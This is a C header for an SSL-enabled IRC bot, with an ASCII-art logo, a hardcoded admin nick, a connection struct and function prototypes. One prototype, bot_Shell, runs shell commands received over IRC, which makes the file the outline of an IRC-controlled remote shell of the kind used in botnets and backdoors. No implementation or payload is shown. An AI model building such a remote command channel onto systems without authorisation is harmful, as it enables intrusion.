/*

  Data structure definitions and prototypes.

*/

/* Bot art logo */
char bot_Brand[] = {
  226, 150, 170, 32, 32, 226, 150, 132, 226, 150, 
  132, 226, 150, 132, 32, 32, 32, 226, 150, 132, 
  226, 150, 132, 194, 183, 32, 226, 150, 132, 226, 
  150, 132, 226, 150, 132, 226, 150, 132, 194, 183, 
  32, 10, 226, 150, 136, 226, 150, 136, 32, 226, 
  150, 128, 226, 150, 132, 32, 226, 150, 136, 194, 
  183, 226, 150, 144, 226, 150, 136, 32, 226, 150, 
  140, 226, 150, 170, 226, 150, 144, 226, 150, 136, 
  32, 226, 150, 128, 226, 150, 136, 226, 150, 170, 
  10, 226, 150, 144, 226, 150, 136, 194, 183, 226, 
  150, 144, 226, 150, 128, 226, 150, 128, 226, 150, 
  132, 32, 226, 150, 136, 226, 150, 136, 32, 226, 
  150, 132, 226, 150, 132, 226, 150, 144, 226, 150, 
  136, 226, 150, 128, 226, 150, 128, 226, 150, 136, 
  226, 150, 132, 10, 226, 150, 144, 226, 150, 136, 
  226, 150, 140, 226, 150, 144, 226, 150, 136, 226, 
  128, 162, 226, 150, 136, 226, 150, 140, 226, 150, 
  144, 226, 150, 136, 226, 150, 136, 226, 150, 136, 
  226, 150, 140, 226, 150, 136, 226, 150, 136, 226, 
  150, 132, 226, 150, 170, 226, 150, 144, 226, 150, 
  136, 10, 226, 150, 128, 226, 150, 128, 226, 150, 
  128, 46, 226, 150, 128, 32, 32, 226, 150, 128, 
  194, 183, 226, 150, 128, 226, 150, 128, 226, 150, 
  128, 32, 194, 183, 226, 150, 128, 226, 150, 128, 
  226, 150, 128, 226, 150, 128, 32, 00
};

/* bot adm nick */
#define BOT_ADM "stackiller"

/* get the size of the array pointer. */
#define ARRAY_SIZE(x) ((sizeof(x)) / (sizeof(x[0])))

/* Irc connection data structure. */
typedef struct {
  SSL_CTX *ctx; // ssl context pointer.
  SSL *ssl; // ssl descriptor.
  int sockfd; // socket descriptor
  char *host, *port; // host & port.
  char *nick, *pass; // nick & pass.
  char *chans, **buffer_matrix; // channels & buffer.
  int buffer_matrix_size;
  int pong;
  int reconnect;
} irc_d;

void *check_Timeout(void*); // check timeout.
void* thread_recv(void *); // thread to r_Buffer.

/* Function prototypes */
SSL_CTX* init_Ctx(void); // initializes a new ssl context.
void show_Certs(SSL*); // show ssl certificates.

int new_conn(const char*, const char*); // creates a socket.
int init_conn(irc_d *); // init connection.
int end_conn(irc_d *); // end connection.
int recon_conn(irc_d*); // reconnect connection.

int checkNull(void*); // checks if the pointer is null.
int str_Cmp(char*, char*); // compares two strings.
int diff_from_chs(char, char*); // compare if ch is different from the elements of the chs array.
int matrix_haveNull(char**, int); // checks if an array has any null elements.

char *string(char*); // initialize a new string.
char *str_realloc(char*, int); // reallocates an array to a new size.

void null_safe_release(void *ptr); // releases a pointer with null safety.
void global_variables_reset(void); // reset global control variables.

void matrix_Destroy(char **, int); // destroys a matrix.
void matrix_stack_Destroy(char **, int); // destroys a matrix elements refered in stack.
void read_matrix_Buffer(char**, int); // Reads the matrix buffer.

char** matrix_Alloc(int); // allocates matrix buffer.
char** matrix_Realloc(char**, int); // reallocates the matrix size.

char** format_Buffer(char*, int*);
char** r_Buffer(int*); // reads the buffer.

char* get_Dst(char*); // gets the recipient.
char* get_Msg(char*); // get the message.
char* get_Src(char*); // get the source.
char* get_nArg(char*, int); // get n arg.
char* get_Args(char*); // get all arguments from message.

int get_Code(char*); // gets the code of server message.

int bot_Exec(char*, char*, char*); // controls the commands to be executed by the bot.
int bot_Pong(char*); // pong.

void msg_Send(char*); // send a message to the irc server.

void bot_Nick(char*); // nick.
void bot_Creds(char*, char*); // credentials.
void bot_Join(char*); // join.
void bot_Priv(char*, char*); // privmsg.
void bot_Part(char*); // part.
void bot_Quit(void); // quit.
void bot_Reconnect(void); // reconnect.
void bot_Shell(char*, char*); // executes shell commands.

void bot_Header(void); // bot header.
void usage(char*); // helps user.

// Static control variables.
int user_flag = 0; 

// Variables used in new_conn.
struct addrinfo *addri, *addri_next;

// Sizes.
#define BUFFER_MAX_SIZE 512 * 10
#define BUFFER_MAX_LINE_SIZE 512
#define BOT_MAX_LEN 50

// Messages.
#define PART_MESSAGE "still on the server, just keeping an eye on it ..."
#define QUIT_MESSAGE "./kernel_panic"

// Colors.
#define fReg "\e[91m"
#define fGreen "\e[92m"
#define fYellow "\e[93m"
#define fBlue "\e[94m"
#define fCyan "\e[96m"

#define fRs "\e[0m"
#define fBlink "\e[5m"